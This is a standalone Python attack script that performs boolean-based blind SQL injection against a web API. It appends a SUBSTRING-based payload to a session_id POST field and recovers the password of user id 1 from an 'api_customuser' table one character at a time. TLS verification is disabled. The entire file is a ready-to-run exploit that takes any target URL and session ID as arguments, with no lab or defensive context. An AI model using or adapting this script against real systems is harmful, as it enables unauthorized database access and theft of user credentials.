import requests
import sys
import argparse

def main(session_id, url):
    password_extracted = []
    allowed_chars = [str(i) for i in range(10)]  # Digits '0' to '9'
    allowed_chars.extend([chr(j) for j in range(ord('a'), ord('z')+1)])  # Lowercase letters 'a' to 'z'

    try:
        for i in range(1, 20):
            for char in allowed_chars:
                sqli_payload = f"' AND SUBSTRING((SELECT password FROM api_customuser WHERE id=1), {i}, 1) = '{char}'--"
                data = {'session_id': session_id + sqli_payload}
                r = requests.post(url, data=data, verify=False)  
                if r.status_code == 200:  
                    password_extracted.append(char)
                    sys.stdout.write('\r' + ''.join(password_extracted))
                    sys.stdout.flush()
                    break
            else:
                break 

        print("\n(+) Password extracted:", ''.join(password_extracted))

    except Exception as e:
        print("\n(-) An error occurred:", e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Extract password through SQL injection.")
    parser.add_argument("session_id", help="Session ID for the API")
    parser.add_argument("url", help="URL for the API")
    args = parser.parse_args()
    main(args.session_id, args.url)
